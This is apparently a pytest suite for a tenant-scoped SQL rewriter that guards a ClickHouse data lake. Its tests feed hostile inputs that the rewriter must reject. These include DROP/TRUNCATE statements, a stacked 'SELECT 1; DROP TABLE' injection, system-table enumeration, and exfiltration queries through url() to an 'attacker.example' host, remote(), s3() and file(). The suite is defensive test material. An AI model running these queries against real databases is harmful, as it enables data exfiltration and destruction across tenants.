"""Unit tests for :mod:`app.services.lake_sql` (Workstream 7).

The SQL rewriter is the security boundary between untrusted callers and
ClickHouse. These tests are the authoritative behavioural spec — every
change in the rewriter must keep these green and ideally extend them.

The threat model we encode here:

* SELECT-only.  DML/DDL is rejected as ``LakeSqlForbiddenError``.
* Single statement only.  ``SELECT 1; DROP TABLE x`` is rejected.
* Allowlist on tables.  References to ``system.tables``, raw operator
  tables in Postgres, or "anything not in ALLOWED_TABLES" are rejected.
* No ClickHouse table-valued functions.  ``url()``, ``s3()``, ``file()``,
  ``remote()``, ``mysql()``, ``postgresql()`` are exfiltration vectors.
* ``tenant_id`` predicate is injected on *every* SELECT in the tree —
  top-level, joins, subqueries, and CTE bodies — so a bare CTE or
  IN (SELECT …) cannot leak data.
* ``LIMIT`` is clamped to ``DEFAULT_ROW_CAP`` (or the caller-supplied
  ``row_cap``, capped at ``MAX_ROW_CAP``).

Tests deliberately avoid the database — the rewriter is a pure function
over a SQL string + tenant UUID. That keeps these tests millisecond-fast
and lets them run on every change without a Postgres or ClickHouse
container.
"""

from __future__ import annotations

import re
import uuid

import pytest
from app.services.lake_sql import (
    ALLOWED_TABLES,
    DEFAULT_ROW_CAP,
    DEFAULT_SCHEMA,
    MAX_ROW_CAP,
    LakeSqlForbiddenError,
    LakeSqlSyntaxError,
    rewrite_for_tenant,
)

# A stable tenant UUID we can grep for in the rewritten SQL. Picked once
# at import time so every test in the module gets the same value, which
# makes assertion failures easier to read.
TENANT_ID = uuid.UUID("00000000-0000-0000-0000-000000000abc")


def _count_predicates(sql: str, tenant_id: uuid.UUID) -> int:
    """Count occurrences of ``tenant_id = '<uuid>'`` in ``sql``.

    sqlglot may render the predicate with a table alias prefix
    (e.g. ``r.tenant_id = '...'``) so we match both the bare and the
    qualified form via regex.
    """
    pattern = rf"(?:\w+\.)?tenant_id\s*=\s*'{tenant_id}'"
    return len(re.findall(pattern, sql, flags=re.IGNORECASE))


# ============================================================================
# Forbidden roots
# ============================================================================


@pytest.mark.parametrize(
    "sql",
    [
        "INSERT INTO aisoc.raw_events (tenant_id) VALUES ('x')",
        "UPDATE aisoc.raw_events SET tenant_id = 'x' WHERE 1=1",
        "DELETE FROM aisoc.raw_events",
        "DROP TABLE aisoc.raw_events",
        "CREATE TABLE evil (x Int32)",
        "ALTER TABLE aisoc.raw_events ADD COLUMN evil Int32",
        "TRUNCATE TABLE aisoc.raw_events",
    ],
)
def test_dml_ddl_rejected_with_forbidden_error(sql: str) -> None:
    """DML/DDL must be rejected as *forbidden*, not as syntax errors.

    The endpoint maps ``LakeSqlForbiddenError`` to HTTP 403 (auth) and
    ``LakeSqlSyntaxError`` to HTTP 400 (parse). Misclassifying a DROP
    as a syntax error would let it look like a typo in client UIs.
    """
    with pytest.raises(LakeSqlForbiddenError):
        rewrite_for_tenant(sql, TENANT_ID)


@pytest.mark.parametrize(
    "sql",
    [
        # ClickHouse SYSTEM / OPTIMIZE / KILL — parsed as Command/Kill
        # nodes by sqlglot. These can move data, kill queries, or read
        # engine internals; none of which belong on the lake API. We
        # use a *parseable* KILL form here — the malformed ``KILL QUERY
        # WHERE …`` shape would surface as a 400 syntax error instead,
        # which is also fine but tested separately under the syntax
        # error suite.
        "SYSTEM RELOAD CONFIG",
        "OPTIMIZE TABLE aisoc.raw_events",
        "KILL QUERY 'long-running-query-id'",
    ],
)
def test_clickhouse_admin_commands_rejected(sql: str) -> None:
    with pytest.raises(LakeSqlForbiddenError):
        rewrite_for_tenant(sql, TENANT_ID)


def test_multiple_statements_rejected() -> None:
    """``SELECT 1; DROP TABLE x`` must die at the boundary.

    The first statement on its own would parse fine; we explicitly
    detect the second statement and refuse the whole request.
    """
    sql = "SELECT 1; DROP TABLE aisoc.raw_events"
    with pytest.raises(LakeSqlForbiddenError, match="single statement"):
        rewrite_for_tenant(sql, TENANT_ID)


# ============================================================================
# Syntax errors
# ============================================================================


@pytest.mark.parametrize(
    "sql",
    [
        "",
        "   ",
        ";",
        "SELECT",  # incomplete
        "this is not sql",  # garbage tokens
    ],
)
def test_garbage_input_raises_syntax_error(sql: str) -> None:
    """Parser-level garbage gets a 400 mapping (LakeSqlSyntaxError).

    These are user typos, not auth violations, so they must be cleanly
    distinguishable from forbidden-class errors.
    """
    with pytest.raises(LakeSqlSyntaxError):
        rewrite_for_tenant(sql, TENANT_ID)


def test_select_with_no_from_passes_through_unchanged() -> None:
    """``SELECT 1`` is allowed; it touches no tenant data.

    There's no ``FROM`` to inject a predicate against, but the
    rewriter must not refuse — operators sometimes use the lake to
    sanity-check ClickHouse expression evaluation.
    """
    result = rewrite_for_tenant("SELECT 1 AS hello", TENANT_ID)
    assert "tenant_id" not in result.sql.lower()
    # No tables touched.
    assert result.referenced_tables == frozenset()


# ============================================================================
# Allowlist enforcement
# ============================================================================


def test_qualified_allowlisted_table_accepted() -> None:
    result = rewrite_for_tenant("SELECT * FROM aisoc.raw_events", TENANT_ID)
    assert "aisoc.raw_events" in result.referenced_tables
    assert _count_predicates(result.sql, TENANT_ID) == 1


def test_unqualified_allowlisted_table_accepted_and_qualified() -> None:
    """``FROM raw_events`` resolves to ``aisoc.raw_events``.

    The rewriter backfills the schema so the ClickHouse session
    database doesn't influence which physical table we hit.
    """
    result = rewrite_for_tenant("SELECT * FROM raw_events", TENANT_ID)
    assert f"{DEFAULT_SCHEMA}.raw_events" in result.sql.lower()
    assert "aisoc.raw_events" in result.referenced_tables


@pytest.mark.parametrize(
    "sql",
    [
        # Postgres tables that happen to share names with our lake.
        "SELECT * FROM aisoc.users",
        # ClickHouse system tables — useful for an attacker to enumerate
        # schemas, tables, parts, and ongoing queries from other tenants.
        "SELECT * FROM system.tables",
        "SELECT * FROM system.processes",
        "SELECT * FROM system.parts",
        # Wrong schema entirely.
        "SELECT * FROM other_db.raw_events",
    ],
)
def test_non_allowlisted_tables_rejected(sql: str) -> None:
    with pytest.raises(LakeSqlForbiddenError, match="allowlist"):
        rewrite_for_tenant(sql, TENANT_ID)


@pytest.mark.parametrize(
    "sql",
    [
        # url() — straight exfiltration. Picks up any URL the worker
        # can resolve, including the metadata endpoint on most clouds.
        "SELECT * FROM url('https://attacker.example/x', JSONEachRow, 'tenant_id String')",
        # remote() — read another ClickHouse cluster, possibly inside
        # the operator's VPC.
        "SELECT * FROM remote('other-host', 'aisoc', 'raw_events')",
        # s3() / file() / mysql() / postgresql() — same family.
        "SELECT * FROM s3('s3://bucket/key', 'CSV')",
        "SELECT * FROM file('/tmp/x', 'CSV')",
        "SELECT * FROM mysql('host', 'db', 'tbl', 'user', 'pw')",
        "SELECT * FROM postgresql('host', 'db', 'tbl', 'user', 'pw')",
    ],
)
def test_table_functions_rejected(sql: str) -> None:
    """ClickHouse table-valued functions are exfiltration vectors.

    Even if our rewriter somehow injected a tenant predicate, a
    ``url(...)`` table doesn't carry tenant data — it's a
    server-side HTTP fetch with the operator's network identity.
    """
    with pytest.raises(LakeSqlForbiddenError):
        rewrite_for_tenant(sql, TENANT_ID)


# ============================================================================
# Tenant predicate injection
# ============================================================================


def test_predicate_injected_on_simple_select() -> None:
    result = rewrite_for_tenant("SELECT id FROM aisoc.raw_events", TENANT_ID)
    assert _count_predicates(result.sql, TENANT_ID) == 1


def test_predicate_appended_alongside_existing_where() -> None:
    """Existing WHERE clauses are preserved; we AND-in our predicate.

    A common audit pattern: an analyst's existing filter on
    ``severity = 'high'`` must still be honoured after rewriting.
    """
    result = rewrite_for_tenant(
        "SELECT id FROM aisoc.raw_events WHERE severity = 'high'",
        TENANT_ID,
    )
    sql_lower = result.sql.lower()
    assert "severity" in sql_lower
    assert _count_predicates(result.sql, TENANT_ID) == 1


def test_predicate_injected_on_each_join_side() -> None:
    """Joins must filter both sides on tenant_id.

    A naive single-table predicate would let an attacker join into a
    second tenant's rows on a non-tenant column (e.g. ``ON r.host =
    a.host``) and read them through the join. The rewriter prevents
    that by injecting per-table predicates when there are aliases.
    """
    sql = """
        SELECT r.id
        FROM aisoc.raw_events r
        JOIN aisoc.alert_metrics a ON a.event_id = r.id
    """
    result = rewrite_for_tenant(sql, TENANT_ID)
    # Two real tables → at least two predicates (one per alias).
    assert _count_predicates(result.sql, TENANT_ID) >= 2
    assert "aisoc.raw_events" in result.referenced_tables
    assert "aisoc.alert_metrics" in result.referenced_tables


def test_predicate_injected_on_subquery() -> None:
    """A subquery in a WHERE/IN clause must also be tenant-scoped.

    Without this, an analyst could write ``WHERE id IN (SELECT id FROM
    raw_events)`` and the outer query would silently see other
    tenants' data via the inner.
    """
    sql = """
        SELECT id FROM aisoc.alert_metrics
        WHERE event_id IN (SELECT id FROM aisoc.raw_events)
    """
    result = rewrite_for_tenant(sql, TENANT_ID)
    # Outer + inner SELECTs each pick up a predicate.
    assert _count_predicates(result.sql, TENANT_ID) >= 2


def test_predicate_injected_on_cte_body() -> None:
    """CTE bodies are SELECTs and must carry the predicate.

    The reference *to* a CTE alias from outside doesn't need a
    predicate (the body already had one), but the body itself must.
    """
    sql = """
        WITH highs AS (
            SELECT id FROM aisoc.raw_events WHERE severity = 'high'
        )
        SELECT * FROM highs
    """
    result = rewrite_for_tenant(sql, TENANT_ID)
    # Predicate appears at least once — inside the CTE body. The
    # outer ``SELECT * FROM highs`` references an alias not a real
    # table, so it doesn't add a second predicate.
    assert _count_predicates(result.sql, TENANT_ID) >= 1


def test_cte_alias_not_treated_as_real_table() -> None:
    """A CTE alias must not be mistaken for a non-allowlisted table.

    Without alias awareness the rewriter would reject ``FROM highs``
    because ``aisoc.highs`` isn't in the allowlist.
    """
    sql = """
        WITH highs AS (SELECT id FROM aisoc.raw_events)
        SELECT * FROM highs
    """
    # Just running this without an exception is the assertion.
    result = rewrite_for_tenant(sql, TENANT_ID)
    # And we must not record ``aisoc.highs`` as a referenced table.
    assert "aisoc.highs" not in result.referenced_tables


def test_union_branches_each_get_predicate() -> None:
    """UNION must filter each branch independently."""
    sql = """
        SELECT id FROM aisoc.raw_events
        UNION ALL
        SELECT id FROM aisoc.alert_metrics
    """
    result = rewrite_for_tenant(sql, TENANT_ID)
    assert _count_predicates(result.sql, TENANT_ID) >= 2


# ============================================================================
# LIMIT clamping
# ============================================================================


def test_default_row_cap_applied_when_no_limit() -> None:
    result = rewrite_for_tenant("SELECT * FROM aisoc.raw_events", TENANT_ID)
    assert result.row_cap == DEFAULT_ROW_CAP
    assert f"limit {DEFAULT_ROW_CAP}" in result.sql.lower()


def test_caller_smaller_limit_preserved() -> None:
    """If the caller asked for fewer rows than the cap, keep theirs.

    The cap exists to prevent runaway queries, not to expand them.
    """
    result = rewrite_for_tenant("SELECT * FROM aisoc.raw_events LIMIT 5", TENANT_ID)
    # The clamp leaves the LIMIT alone.
    assert "limit 5" in result.sql.lower()
    # ``row_cap`` reflects the configured cap (the LIMIT is below it).
    assert result.row_cap == DEFAULT_ROW_CAP


def test_caller_larger_limit_clamped_to_default() -> None:
    """A naked ``LIMIT 1000000`` must be clamped to the default cap."""
    sql = "SELECT * FROM aisoc.raw_events LIMIT 1000000"
    result = rewrite_for_tenant(sql, TENANT_ID)
    assert result.row_cap == DEFAULT_ROW_CAP
    assert f"limit {DEFAULT_ROW_CAP}" in result.sql.lower()


def test_explicit_row_cap_respected() -> None:
    result = rewrite_for_tenant("SELECT * FROM aisoc.raw_events", TENANT_ID, row_cap=50)
    assert result.row_cap == 50
    assert "limit 50" in result.sql.lower()


def test_row_cap_clamped_to_max() -> None:
    """A caller-supplied cap above MAX_ROW_CAP is reduced."""
    result = rewrite_for_tenant(
        "SELECT * FROM aisoc.raw_events",
        TENANT_ID,
        row_cap=MAX_ROW_CAP * 10,
    )
    assert result.row_cap == MAX_ROW_CAP


def test_row_cap_clamped_to_minimum() -> None:
    """A zero or negative cap is coerced to 1."""
    result = rewrite_for_tenant(
        "SELECT * FROM aisoc.raw_events",
        TENANT_ID,
        row_cap=0,
    )
    assert result.row_cap == 1


# ============================================================================
# Allowlist tables roster
# ============================================================================


def test_allowed_tables_constant_matches_clickhouse_schema() -> None:
    """Every entry in ALLOWED_TABLES must look like ``aisoc.<name>``.

    This is a smoke test against typos: if someone added
    ``"raw_events"`` (no schema) we'd silently default-qualify it
    in code but the constant itself would lie.
    """
    for name in ALLOWED_TABLES:
        assert "." in name, f"unqualified table in allowlist: {name}"
        schema, _ = name.split(".", 1)
        assert schema == DEFAULT_SCHEMA, f"unexpected schema: {schema}"
